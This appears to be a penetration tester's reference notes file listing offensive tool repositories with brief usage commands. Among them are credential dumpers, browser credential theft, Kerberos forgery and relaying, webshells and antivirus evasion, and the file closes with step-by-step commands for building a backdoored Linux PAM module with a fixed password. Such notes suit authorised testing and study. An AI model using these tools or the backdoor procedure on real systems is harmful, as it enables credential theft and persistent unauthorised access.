# linux exploit suggester
https://github.com/mzet-/linux-exploit-suggester
sudo ln -s /opt/linux-exploit-suggester/linux-exploit-suggester.sh /var/www/html/suggester.sh

# linpeas winpeas peass-ng release downloads
https://github.com/carlospolop/PEASS-ng/releases

# hacktricks markdown data github
https://github.com/carlospolop/hacktricks

# seclists github
https://github.com/danielmiessler/SecLists

# payloads payloadsallthethings github
https://github.com/swisskyrepo/PayloadsAllTheThings

# OWASP cheat sheet series
https://github.com/OWASP/CheatSheetSeries

# Compiled versions of .NET Windows enumeration tools
https://github.com/Flangvik/SharpCollection

# Scanning a system for credentials
https://github.com/AlessandroZ/LaZagne

# automated SSTI testing with tplmap
https://github.com/epinna/tplmap

# dump git repository leaked by website
https://github.com/arthaud/git-dumper
pip3 install git-dumper

# webshells for all sorts of languages
https://github.com/tennc/webshell

# obfuscate powershell scripts (python)
https://github.com/klezVirus/chameleon

# HTML preview report input list of HTTP(s) sites attack surface with aquatone
https://github.com/michenriksen/aquatone

# generate wordlists
## namemash - simple
github gist superkojiman/namemash.py
https://gist.github.com/superkojiman/11076951

## username anarchy, generate from lists of names, from country and locale
https://github.com/urbanadventurer/username-anarchy
list formats with `-l`.

### output all formats
by omitting format parameter
```bash
./username-anarchy -i test-names.txt
```

#### top 10k names from facebook
#### generate common usernames for country and localization 
```bash
./username-anarchy -a -c us
```
COUNTRY can be one of the following datasets: switzerland, uk, us,
argentina, austria, belgium, canada, china, denmark, france, germany, hungary, india, ireland,
italy, luxembourg, netherlands, newzealand, norway, poland, serbia, slovenia, spain, sweden
Other: Facebook - uses the Facebook top 10,000 names - don't run this with all formats

## bopscrk people OSINT custom wordlists specific to person
https://github.com/r3nt0n/bopscrk
```bash
pip install bopscrk
# run in interactive mode
bopscrk -i
```


# zip slip evilarc.py
https://github.com/ptoomey3/evilarc

# kerberos attack on windows host
https://github.com/GhostPack/Rubeus
## ticket attacks
### forgery
### extraction and harvesting
## Constrained delegation abuse

# finger user enum
https://github.com/pentestmonkey/finger-user-enum
```bash
finger-user-enum.pl -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
# pipe to less -S to handle long lines
```

# text cipher encryption decryption tools
## Affine
## Atbash
## Baconian
## Bifid
## Caesarian Shift
## Keyed Caesar
## Columnar
## Transposition
## Double Transposition
## Cryptogram Solver
## Gronsfeld
## Morse Code
## Letter Numbers
## One Time Pad
## Playfair
## Railfence
## ROT13
## Rotate
## Skip
## Substitution
## Übchi
## Vigenere
## Keyed Vigenere
## Vigenere Autokey
## Cryptogram Solver
## Letter Frequency
## Text Manipulator
http://rumkin.com/tools/cipher/

# file backup fuzzer
## generate wordlists from filenames
https://github.com/olemoudi/backup-fuzzer

# krbrelayx
## Kerberos relaying and unconstrained delegation abuse toolkit
## addspn.py This tool can add/remove/modify Service Principal Names on accounts in AD over LDAP.
## dnstool.py Add/modify/delete Active Directory Integrated DNS records via LDAP.
## printerbug.py Simple tool to trigger SpoolService bug via RPC backconnect. Similar to dementor.py
https://github.com/dirkjanm/krbrelayx
## krbrelayx.py Kerberos relaying and Unconstrained delegation abuse
When no credentials are supplied, but at least one target is specified, krbrelayx will forward the Kerberos authentication to a matching target hostname, effectively relaying the authentication. How to get incoming Kerberos auth with a valid SPN is up to you, but you could use mitm6 for this.
In this mode, krbrelayx will either decrypt and dump incoming TGTs embedded in authentication with unconstrained delegation, or immediately use the TGTs to authenticate to a target service. This requires that credentials for an account with unconstrained delegation are specified.

# threatcheck help obfuscate windows executable strings
## evade windows antivirus detection (defender)
### identify and pinpoints that exact bytes that the target antivirus engine will flag on
windows tool that runs AV tools to determine which bytes of a binary are detected by AV.
https://github.com/rasta-mouse/ThreatCheck

# oracle database attacking tool odat
## enumerate users
## escalate database account to DBA
## execute system commands
difficult install. docker available.
https://github.com/quentinhardy/odat

# volatility framework
## analyze dump files of volatile RAM
### file type "MS Windows 64bit crash dump, full dump, XXX pages"
### .dmp .img
extract process list, proc dump, network connections, clipboard, hashdump
```bash
sudo apt install volatility
```
https://github.com/volatilityfoundation/volatility
https://www.volatilityfoundation.org/

# web app paths defaults db
https://github.com/pwnwiki/webappdefaultsdb

# dump credentials from browsers
## chromium
### chrome
### edge
https://github.com/djhohnstein/SharpChromium

## firefox
transfer folder ` C:\Users\username\AppData\Roaming\Mozilla\Firefox\Profiles `
crack with john
decrypt with https://github.com/unode/firefox_decrypt

# convert DLL to shellcode with sRDI
https://github.com/monoxgas/sRDI
sRDI allows for the conversion of DLL files to position independent shellcode.
It attempts to be a fully functional PE loader supporting proper section permissions

# windows fully interactive pty with ConPtyShell
https://github.com/antonioCoco/ConPtyShell
requires obfuscation of comments and function name to bypass defender signatures

# portable TCP port scanner
## bash only
### spookyscan
https://github.com/Sq00ky/Bash-Port-Scanner
- scan ports 1-1000
```bash
./spookyscan.sh -i $IP -p 1000
```

# connect to minecraft server and send chat messages
https://github.com/TechSupportJosh/example-mc-chat

# windows run commnads as other user with credentials
## switch users on windows host with RunasCs with no WinRM remote management access
https://github.com/antonioCoco/RunasCs
available as a powershell script or a C# program in the releases.
The C# program works even if windows remote management is disabled.

# jxplorer connect to LDAP GUI access
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap#jxplorer

# create malicious ODT file payload to leak NTLMv2 hashes with badodf
https://github.com/rmdavy/badodf

# linux and windows privilege escalation mind maps OSCP
https://github.com/C0nd4/OSCP-Priv-Esc

# .NET decompiler reverse engineering C# managed EXE DLL binaries
## modify rebuild and recompile .NET assemblies
https://github.com/dnSpy/dnSpy

# linux PAM module backdoor password build script
https://github.com/zephrax/linux-pam-backdoor
```bash
## find path
find /usr/lib -name pam_unix.so 2>/dev/null

## determine pam version on target
### debian
dpkg -l | grep pam
### centos / redhat / RHEL
rpm -qa | grep pam

docker run --rm -v "$(pwd):/host" -it kalilinux/kali-rolling

apt update
apt install -y git wget autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc

git clone https://github.com/zephrax/linux-pam-backdoor
cd linux-pam-backdoor
./backdoor.sh -v 1.5.2 -p password1234
cp pam_unix.so /host
exit
```
